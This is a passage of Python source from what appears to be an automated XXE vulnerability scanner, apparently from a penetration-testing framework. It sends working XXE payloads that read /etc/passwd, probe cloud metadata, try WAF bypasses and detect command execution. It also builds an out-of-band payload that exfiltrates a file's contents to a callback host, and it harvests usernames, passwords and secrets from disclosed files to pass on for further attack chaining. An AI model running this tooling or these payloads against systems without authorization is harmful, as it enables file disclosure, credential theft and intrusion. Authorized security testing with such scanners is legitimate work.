                    if isinstance(asset_data, dict):
                        file_content = metadata.get("file_content", "")

                    finding_data = {
                        "type": VulnType.XXE,
                        "endpoint": endpoint,
                        "severity": f.get("severity", "HIGH"),
                        "file_content": file_content,
                    }

                    # Adicionar parâmetro apenas se 'data' for dict
                    if isinstance(asset_data, dict):
                        finding_data["parameter"] = metadata.get("param", "")

                    await store.add_finding(finding_data, module="xxe")


                    # THEME-4: Extract and share data from XXE file reads
                    if file_content:
                        await self._share_xxe_extracted_data(file_content, endpoint, store)

            if findings_dicts:
                logger.debug(f"[XXE] Shared {len(findings_dicts)} findings to cross-module store")
        except Exception as e:
            logger.debug(f"[XXE] Could not share findings: {e}")

        return {
            "module": self.name,
            "version": XXE_SCANNER_VERSION,
            "findings": findings_dicts,
            "metadata": {
                "detected_waf": self.detected_waf.name if self.detected_waf else None,
                "detected_parser": self.detected_parser.name if self.detected_parser != XMLParser.UNKNOWN else None,
                "endpoints_tested": len(xml_endpoints),
                "total_findings": len(findings_dicts),
            }
        }
    
    async def _detect_waf(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> Optional[WAFType]:
        """Detect WAF by sending malicious XML."""
        test_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''
        
        await rate_limiter.acquire()
        
        try:
            response = await client.post(
                base_url,
                content=test_payload,
                headers={"Content-Type": "application/xml"}
            )
            return WAFDetector.detect(response)
        except Exception:
            return None
    
    async def _find_xml_endpoints(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[str]:
        """Find endpoints that accept XML."""
        endpoints = []
        
        for path in self.XML_ENDPOINTS:
            await rate_limiter.acquire()
            
            url = urljoin(base_url, path)
            
            try:
                # Try POST with XML content-type
                response = await client.post(
                    url,
                    content="<?xml version='1.0'?><test/>",
                    headers={"Content-Type": "application/xml"}
                )
                
                # Check if endpoint accepts XML
                if response.status_code not in [404, 405, 501]:
                    endpoints.append(url)
                    
                    # Try to fingerprint parser from response
                    self._fingerprint_parser(response)
                    
            except Exception as e:
                logger.debug(f"XML endpoint check error for {url}: {e}")
        
        return endpoints
    
    def _fingerprint_parser(self, response: httpx.Response) -> None:
        """Fingerprint XML parser from response."""
        content = response.text.lower()
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        if "lxml" in content or "libxml" in content:
            self.detected_parser = XMLParser.LIBXML2
        elif "expat" in content:
            self.detected_parser = XMLParser.EXPAT
        elif "xerces" in content or "java" in content:
            self.detected_parser = XMLParser.XERCES
        elif "system.xml" in content or "asp.net" in headers.get("server", ""):
            self.detected_parser = XMLParser.MSXML
        elif "php" in headers.get("server", "") or "php" in headers.get("x-powered-by", ""):
            self.detected_parser = XMLParser.LIBXML2  # PHP usually uses libxml2
    
    async def _test_endpoint(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        endpoint: str,
        rate_limiter: RateLimiter,
    ) -> None:
        """Test endpoint for XXE vulnerabilities."""
        # Get baseline
        try:
            await rate_limiter.acquire()
            baseline = await client.post(
                endpoint,
                content="<?xml version='1.0'?><root><data>test</data></root>",
                headers={"Content-Type": "application/xml"}
            )
            baseline_text = baseline.text
        except Exception:
            return
        
        # PERF-FIX 2026-02-12: Reduced payloads per endpoint for faster scanning
        # Test classic XXE payloads (3 instead of 6 - most important variants)
        for payload_name, payload in list(self.CLASSIC_PAYLOADS.items())[:3]:
            finding = await self._test_payload(
                client, endpoint, payload, payload_name,
                XXEType.CLASSIC, "file://", baseline_text, rate_limiter
            )
            if finding:
                self.findings.append(finding)
                break  # Found XXE, stop testing this endpoint

        # Test PHP wrappers (only if no classic XXE found)
        if not any(f.url == endpoint for f in self.findings):
            for payload_name, payload in list(self.PHP_PAYLOADS.items())[:2]:
                finding = await self._test_payload(
                    client, endpoint, payload, payload_name,
                    XXEType.CLASSIC, "php://", baseline_text, rate_limiter
                )
                if finding:
                    self.findings.append(finding)
                    break  # Found PHP XXE, stop testing

        # Test SSRF payloads (only if nothing found yet)
        if not any(f.url == endpoint for f in self.findings):
            for payload_name, payload in list(self.SSRF_PAYLOADS.items())[:2]:
                finding = await self._test_payload(
                    client, endpoint, payload, payload_name,
                    XXEType.SSRF, "http://", baseline_text, rate_limiter
                )
                if finding:
                    self.findings.append(finding)
                    break
        
        # Test error-based if nothing found
        if not any(f.url == endpoint for f in self.findings):
            for payload_name, payload in self.ERROR_PAYLOADS.items():
                finding = await self._test_error_based(
                    client, endpoint, payload, baseline_text, rate_limiter
                )
                if finding:
                    self.findings.append(finding)
                    break
        
        # WAF bypass if WAF detected
        if self.detected_waf and not any(f.url == endpoint for f in self.findings):
            for payload_name, payload in self.WAF_BYPASS_PAYLOADS.items():
                finding = await self._test_payload(
                    client, endpoint, payload, payload_name,
                    XXEType.CLASSIC, "file://", baseline_text, rate_limiter
                )
                if finding:
                    finding.waf_bypassed = True
                    self.findings.append(finding)
                    break

        # FN-M4 FIX: Test XInclude - works even when DTD processing is disabled
        if not any(f.url == endpoint for f in self.findings):
            for payload_name, payload in self.XINCLUDE_PAYLOADS.items():
                finding = await self._test_payload(
                    client, endpoint, payload, payload_name,
                    XXEType.XINCLUDE, "xinclude://", baseline_text, rate_limiter
                )
                if finding:
                    finding.metadata["attack_vector"] = "XInclude"
                    self.findings.append(finding)
                    # FN-C1 FIX: Don't break - test multiple XInclude variants

    async def _test_payload(
        self,
        client: httpx.AsyncClient,
        endpoint: str,
        payload: str,
        payload_name: str,
        xxe_type: XXEType,
        protocol: str,
        baseline_text: str,
        rate_limiter: RateLimiter,
    ) -> Optional[XXEFinding]:
        """Test a single XXE payload."""
        await rate_limiter.acquire()
        
        try:
            response = await client.post(
                endpoint,
                content=payload,
                headers={
                    "Content-Type": "application/xml",
                    "Accept": "application/xml, text/xml, */*",
                }
            )
            
            detected, evidence, file_disclosed, file_content = self._analyze_response(
                response, payload_name, baseline_text
            )

            if detected:
                confidence = self._calculate_confidence(evidence, response)

                return XXEFinding(
                    url=endpoint,
                    xxe_type=xxe_type,
                    payload=payload_name,
                    protocol=protocol,
                    parser=self.detected_parser,
                    content_format=ContentFormat.XML,
                    detection_method="response_analysis",
                    evidence=evidence,
                    confidence=confidence,
                    file_disclosed=file_disclosed,
                    waf_detected=self.detected_waf,
                    file_content=file_content,
                )
                
        except Exception as e:
            logger.debug(f"XXE test error: {e}")
        
        return None
    
    async def _test_error_based(
        self,
        client: httpx.AsyncClient,
        endpoint: str,
        payload: str,
        baseline_text: str,
        rate_limiter: RateLimiter,
    ) -> Optional[XXEFinding]:
        """Test error-based XXE."""
        await rate_limiter.acquire()
        
        try:
            response = await client.post(
                endpoint,
                content=payload,
                headers={"Content-Type": "application/xml"}
            )
            
            content = response.text
            evidence = []
            
            # Look for file content in error messages
            for file_type, indicators in self.FILE_INDICATORS.items():
                for indicator in indicators:
                    if indicator in content and indicator not in baseline_text:
                        evidence.append(f"File content in error: {indicator}")
                        # Extract file content from error message
                        idx = content.find(indicator)
                        err_content = None
                        if idx >= 0:
                            line_start = content.rfind("\n", 0, idx)
                            line_start = max(0, line_start)
                            err_content = content[line_start:idx + 300].strip()[:500]

                        return XXEFinding(
                            url=endpoint,
                            xxe_type=XXEType.ERROR_BASED,
                            payload="error_based",
                            protocol="file://",
                            parser=self.detected_parser,
                            content_format=ContentFormat.XML,
                            detection_method="error_based",
                            evidence=evidence,
                            confidence=80,
                            file_disclosed=file_type,
                            waf_detected=self.detected_waf,
                            file_content=err_content,
                        )
            
            # Check for XXE-related errors
            for error in self.ERROR_INDICATORS:
                if error.lower() in content.lower():
                    evidence.append(f"XXE error indicator: {error}")
            
            if len(evidence) >= 2:
                return XXEFinding(
                    url=endpoint,
                    xxe_type=XXEType.ERROR_BASED,
                    payload="error_based",
                    protocol="file://",
                    parser=self.detected_parser,
                    content_format=ContentFormat.XML,
                    detection_method="error_indication",
                    evidence=evidence,
                    confidence=60,
                    waf_detected=self.detected_waf,
                )
                
        except Exception as e:
            logger.debug(f"Error-based XXE test error: {e}")
        
        return None
    
    def _analyze_response(
        self,
        response: httpx.Response,
        payload_name: str,
        baseline_text: str,
    ) -> tuple[bool, list[str], Optional[str], Optional[str]]:
        """Analyze response for XXE indicators.

        Returns: (detected, evidence_list, file_type, file_content)
        """
        evidence = []
        content = response.text
        file_disclosed = None
        file_content = None

        # Check for file content
        for file_type, indicators in self.FILE_INDICATORS.items():
            for indicator in indicators:
                if indicator in content and indicator not in baseline_text:
                    evidence.append(f"File content found: {indicator}")
                    file_disclosed = file_type
                    # Extract actual file content from response
                    idx = content.find(indicator)
                    if idx >= 0:
                        # Find line boundaries around the indicator
                        line_start = content.rfind("\n", 0, idx)
                        line_start = max(0, line_start)
                        end = min(len(content), idx + 500)
                        line_end = content.find("</", idx)
                        if line_end > 0 and line_end < end:
                            end = line_end
                        file_content = content[line_start:end].strip()[:500]

        # Check for base64 content (PHP filter)
        if "php_filter" in payload_name:
            base64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
            matches = re.findall(base64_pattern, content)
            for match in matches:
                if match not in baseline_text:
                    try:
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                        if '<?php' in decoded or 'function' in decoded:
                            evidence.append(f"PHP source code disclosed via base64")
                            file_disclosed = "php_source"
                            file_content = decoded[:500]
                    except Exception:
                        pass

        # Check for expect:// RCE
        if "expect" in payload_name:
            if "uid=" in content and "gid=" in content:
                evidence.append("RCE via expect:// - 'id' command executed")
                file_disclosed = "rce_expect"
                # Extract command output
                idx = content.find("uid=")
                if idx >= 0:
                    file_content = content[idx:idx + 200].strip()

        # Check for cloud metadata
        if any(x in payload_name for x in ["aws", "gcp", "azure"]):
            if any(ind in content for ind in ["ami-id", "instance-id", "compute", "vmId"]):
                evidence.append("Cloud metadata disclosed via SSRF")
                file_disclosed = "cloud_metadata"
                # Extract metadata content
                for ind in ["ami-id", "instance-id", "compute", "vmId"]:
                    idx = content.find(ind)
                    if idx >= 0:
                        file_content = content[max(0, idx - 50):idx + 300].strip()[:500]
                        break

        return len(evidence) > 0, evidence, file_disclosed, file_content
    
    def _calculate_confidence(
        self,
        evidence: list[str],
        response: httpx.Response,
    ) -> int:
        """Calculate confidence score."""
        confidence = 50
        
        # More evidence = higher confidence
        confidence += min(len(evidence) * 15, 40)
        
        # File content is very strong indicator
        if any("file content" in e.lower() for e in evidence):
            confidence += 20
        
        # RCE is definitive
        if any("rce" in e.lower() for e in evidence):
            confidence = 100
        
        # Cloud metadata is strong
        if any("cloud metadata" in e.lower() for e in evidence):
            confidence += 15
        
        return min(100, confidence)
    
    async def _test_forms(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        forms: list[dict],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test forms that might accept XML."""
        xml_forms = []
        
        for form in forms:
            inputs = form.get("inputs", [])
            for inp in inputs:
                name = inp.get("name", "").lower()
                input_type = inp.get("type", "").lower()
                
                if input_type == "file" or any(x in name for x in ["xml", "import", "upload", "file", "data"]):
                    xml_forms.append(form)
                    break
        
        for form in xml_forms[:10]:
            action = form.get("action", "")
            form_url = urljoin(base_url, action) if action else base_url
            
            # Test with classic XXE
            for payload_name, payload in list(self.CLASSIC_PAYLOADS.items())[:3]:
                finding = await self._test_payload(
                    client, form_url, payload, payload_name,
                    XXEType.CLASSIC, "file://", "", rate_limiter
                )
                if finding:
                    finding.content_format = ContentFormat.XML
                    self.findings.append(finding)
                    break
    
    async def _test_soap(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> None:
        """Test SOAP services for XXE."""
        soap_paths = ["/soap", "/ws", "/wsdl", "/service", "/services", "/api/soap"]
        
        for path in soap_paths:
            url = urljoin(base_url, path)
            
            for payload_name, payload in self.SOAP_PAYLOADS.items():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        url,
                        content=payload,
                        headers={
                            "Content-Type": "text/xml; charset=utf-8",
                            "SOAPAction": '""',
                        }
                    )
                    
                    if "Envelope" in response.text or "soap:" in response.text.lower():
                        detected, evidence, file_disclosed, file_content = self._analyze_response(
                            response, "soap", ""
                        )

                        if detected:
                            self.findings.append(XXEFinding(
                                url=url,
                                xxe_type=XXEType.CLASSIC,
                                payload=payload_name,
                                protocol="file://",
                                parser=self.detected_parser,
                                content_format=ContentFormat.SOAP,
                                detection_method="soap_xxe",
                                evidence=evidence + ["SOAP service vulnerable"],
                                confidence=90,
                                file_disclosed=file_disclosed,
                                waf_detected=self.detected_waf,
                                file_content=file_content,
                            ))
                            return  # Found SOAP XXE
                            
                except Exception as e:
                    logger.debug(f"SOAP XXE test error: {e}")
    
    async def _test_svg_endpoints(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test SVG upload/processing endpoints."""
        svg_endpoints = [u for u in urls if any(x in u.lower() for x in ["svg", "image", "upload", "avatar"])]
        svg_endpoints.extend([
            urljoin(base_url, "/upload"),
            urljoin(base_url, "/api/upload"),
            urljoin(base_url, "/avatar"),
        ])
        
        # FN-C2 FIX: Test more SVG endpoints (was [:5])
        for endpoint in svg_endpoints[:15]:
            for payload_name, payload in self.SVG_PAYLOADS.items():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        endpoint,
                        content=payload,
                        headers={"Content-Type": "image/svg+xml"}
                    )
                    
                    detected, evidence, file_disclosed, file_content = self._analyze_response(
                        response, "svg", ""
                    )

                    if detected:
                        self.findings.append(XXEFinding(
                            url=endpoint,
                            xxe_type=XXEType.CLASSIC,
                            payload=payload_name,
                            protocol="file://",
                            parser=self.detected_parser,
                            content_format=ContentFormat.SVG,
                            detection_method="svg_xxe",
                            evidence=evidence + ["SVG XXE successful"],
                            confidence=85,
                            file_disclosed=file_disclosed,
                            waf_detected=self.detected_waf,
                            file_content=file_content,
                        ))
                        return
                        
                except Exception as e:
                    logger.debug(f"SVG XXE test error: {e}")

    async def _test_oob_xxe(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        xml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """
        Test for blind/OOB XXE using callback-based detection.

        Uses the OOB Engine to generate payloads with unique tokens and
        verifies callbacks to confirm blind XXE vulnerabilities.
        """
        if not self._oob_engine or not OOB_ENGINE_AVAILABLE:
            logger.debug("[XXE] OOB Engine not available, skipping blind XXE tests")
            return

        logger.debug(f"[XXE] Testing blind/OOB XXE on {len(xml_endpoints)} endpoints")

        for endpoint in xml_endpoints[:10]:
            # Generate OOB payloads with tracking tokens
            oob_payloads = self._oob_engine.generate_oob_payloads(
                scan_id=self._scan_id or hashlib.md5(base_url.encode()).hexdigest()[:8],
                payload_type="xxe",
                target_url=endpoint,
                parameter="xml_body",
            )

            for oob_payload in oob_payloads[:2]:  # Test HTTP and DNS variants
                await rate_limiter.acquire()

                token = oob_payload["oob_token"]
                callback_host = oob_payload["callback_host"]
                callback_domain = oob_payload["callback_domain"]

                # Build OOB XXE payload using our templates
                oob_xxe_http = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{callback_host}/{token}?x=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>'''

                oob_xxe_dns = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{token}.{callback_domain}/xxe">
  %xxe;
]>
<root>test</root>'''

                # Test HTTP-based OOB
                for payload_name, payload in [("oob_http", oob_xxe_http), ("oob_dns", oob_xxe_dns)]:
                    try:
                        response = await client.post(
                            endpoint,
                            content=payload,
                            headers={
                                "Content-Type": "application/xml",
                                "Accept": "application/xml, text/xml, */*",
                            }
                        )

                        # Wait briefly for OOB callback
                        await asyncio.sleep(1.0)

                        # Check if callback was received
                        if self._oob_engine.check_callback(token):
                            callback_evidence = self._oob_engine.get_callback_evidence(token)

                            xxe_type = XXEType.OOB_HTTP if "http" in payload_name else XXEType.OOB_DNS

                            self.findings.append(XXEFinding(
                                url=endpoint,
                                xxe_type=xxe_type,
                                payload=payload_name,
                                protocol="http://" if xxe_type == XXEType.OOB_HTTP else "dns://",
                                parser=self.detected_parser,
                                content_format=ContentFormat.XML,
                                detection_method="oob_callback",
                                evidence=[
                                    f"OOB callback received for token: {token}",
                                    f"Callback type: {callback_evidence.get('first_callback', {}).get('type', 'unknown') if callback_evidence else 'unknown'}",
                                    f"Time to callback: {callback_evidence.get('time_to_callback_ms', 'N/A')}ms" if callback_evidence else "",
                                    "Blind XXE CONFIRMED via out-of-band channel",
                                ],
                                confidence=95,
                                waf_detected=self.detected_waf,
                            ))

                            logger.info(f"🎯 [XXE] Blind XXE CONFIRMED via OOB callback at {endpoint}")
                            return  # Found confirmed blind XXE

                    except Exception as e:
                        logger.debug(f"OOB XXE test error: {e}")

            # Wait a bit longer for delayed callbacks
            await asyncio.sleep(2.0)

            # Check tokens one more time for delayed responses
            for oob_payload in oob_payloads[:2]:
                token = oob_payload["oob_token"]
                if self._oob_engine.check_callback(token):
                    callback_evidence = self._oob_engine.get_callback_evidence(token)

                    self.findings.append(XXEFinding(
                        url=endpoint,
                        xxe_type=XXEType.OOB_HTTP,
                        payload="oob_delayed",
                        protocol="http://",
                        parser=self.detected_parser,
                        content_format=ContentFormat.XML,
                        detection_method="oob_callback_delayed",
                        evidence=[
                            f"Delayed OOB callback received for token: {token}",
                            f"Time to callback: {callback_evidence.get('time_to_callback_ms', 'N/A')}ms" if callback_evidence else "",
                            "Blind XXE CONFIRMED via delayed out-of-band response",
                        ],
                        confidence=90,
                        waf_detected=self.detected_waf,
                    ))

                    logger.info(f"🎯 [XXE] Blind XXE CONFIRMED via delayed OOB callback at {endpoint}")
                    return

    def _finding_to_dict(self, finding: XXEFinding) -> dict[str, Any]:
        """Convert XXEFinding to Finding dict."""
        severity = "CRITICAL"
        cvss = 9.8
        
        if finding.xxe_type == XXEType.ERROR_BASED:
            severity = "HIGH"
            cvss = 8.5
        
        if finding.confidence < 80:
            severity = "HIGH"
            cvss = 7.5
        
        xxe_type_desc = {
            XXEType.CLASSIC: "Classic XXE (File Disclosure)",
            XXEType.BLIND: "Blind XXE",
            XXEType.OOB_HTTP: "Out-of-Band XXE via HTTP",
            XXEType.OOB_DNS: "Out-of-Band XXE via DNS",
            XXEType.ERROR_BASED: "Error-Based XXE",
            XXEType.SSRF: "SSRF via XXE",
            XXEType.RCE: "Remote Code Execution via XXE",
            XXEType.DOS: "DoS via XXE (Billion Laughs)",
            XXEType.XINCLUDE: "XInclude XXE (DTD-Disabled Bypass)",  # FN-M4
        }.get(finding.xxe_type, "XXE")
        
        # Build evidence with file content if available
        evidence_list = finding.evidence + [
            f"Detection method: {finding.detection_method}",
            f"Confidence: {finding.confidence}%",
            f"Scanner: XXE Scanner {XXE_SCANNER_VERSION}",
        ]
        if finding.file_content:
            evidence_list.append(f"Extracted content: {finding.file_content[:200]}...")

        return Finding(
            vuln_type=VulnType.XXE,
                        category=VulnCategory.INJECTION,
            name=f"XML External Entity (XXE) - {xxe_type_desc}",
            severity=severity,
            description=(
                f"XXE vulnerability detected at {finding.url}. "
                f"Type: {finding.xxe_type.name}. "
                f"Protocol: {finding.protocol}. "
                f"Format: {finding.content_format.name}. "
                f"{'File disclosed: ' + finding.file_disclosed if finding.file_disclosed else ''} "
                f"Confidence: {finding.confidence}%."
            ),
            host=finding.url,
            endpoint=finding.url,
            evidence=evidence_list,
            cvss_score=cvss,
            cwe_id="CWE-611",
            metadata={
                "file_content": finding.file_content[:500] if finding.file_content else None,
                "file_disclosed": finding.file_disclosed,
                "xxe_type": finding.xxe_type.name,
                "xml_parser": finding.parser.name if finding.parser else None,
            },
            remediation=(
                "1. Disable external entity processing in XML parser.\n"
                "2. Use defusedxml library in Python.\n"
                "3. Set XMLReader.setFeature('http://xml.org/sax/features/external-general-entities', false).\n"
                "4. Disable DTD processing entirely if not needed.\n"
                "5. Use JSON instead of XML where possible.\n"
                "6. Validate and sanitize XML input.\n"
                "7. Use allowlist for XML namespaces and elements."
            ),
            references=[
                "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                "https://cwe.mitre.org/data/definitions/611.html",
                "https://portswigger.net/web-security/xxe",
            ],
        ).to_dict()

    # =========================================================================
    # THEME-4: Cross-module data sharing
    # =========================================================================

    async def _share_xxe_extracted_data(
        self,
        file_content: str,
        source_endpoint: str,
        store: Any,  # SharedFindingsStore - avoid circular import
    ) -> None:
        """
        Extract and share data from XXE-read files for cross-module consumption.

        THEME-4 FIX: XXE can read files like LFI - share the extracted data.
        """
        import re

        try:
            # Extract usernames from /etc/passwd
            if ":x:" in file_content or ":/bin/" in file_content:
                usernames = []
                for line in file_content.split("\n"):
                    if ":" in line and not line.startswith("#"):
                        parts = line.split(":")
                        if len(parts) >= 3:
                            username = parts[0].strip()
                            shell = parts[-1].strip() if len(parts) >= 7 else ""
                            if username and not any(x in shell for x in ["nologin", "false", "sync"]):
                                usernames.append(username)

                if usernames:
                    await store.add_extracted_data(
                        data_type="usernames",
                        values=usernames[:50],
                        source_module="xxe_scanner",
                        source_endpoint=source_endpoint,
                        context={"file": "/etc/passwd", "extraction_method": "xxe"},
                    )
                    logger.info(f"[THEME-4/XXE] Shared {len(usernames)} usernames from /etc/passwd")

            # Extract credentials from config content
            config_patterns = [
                (r"(?i)password['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "password"),
                (r"(?i)user(?:name)?['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "username"),
                (r"(?i)secret(?:_key)?['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "secret"),
            ]

            extracted = {}
            for pattern, label in config_patterns:
                matches = re.findall(pattern, file_content)
                for match in matches[:5]:
                    if match and len(match) > 3:
                        if label not in extracted:
                            extracted[label] = []
                        extracted[label].append(match)

            if "username" in extracted and "password" in extracted:
                creds = []
                for i, username in enumerate(extracted["username"][:5]):
                    password = extracted["password"][i] if i < len(extracted["password"]) else None
                    if password:
                        creds.append({"username": username, "password_hash": password})

                if creds:
                    await store.add_extracted_data(
                        data_type="credentials",
                        values=creds,
                        source_module="xxe_scanner",
                        source_endpoint=source_endpoint,
                        context={"extraction_method": "xxe_config_read"},
                    )
                    logger.info(f"[THEME-4/XXE] Shared {len(creds)} credentials from config")

            # Register chain opportunity
            await store.add_extracted_data(
                data_type="chain_opportunities",
                values=[{
                    "chain_type": "xxe_to_ssrf",
                    "description": "XXE can read files and potentially make SSRF requests",
                    "file_content_preview": file_content[:100] if file_content else "",
                }],
                source_module="xxe_scanner",
                source_endpoint=source_endpoint,
                context={"suggested_modules": ["ssrf", "lfi", "ssti"]},
            )

        except Exception as e:
            logger.debug(f"[THEME-4/XXE] Failed to share extracted data: {e}")
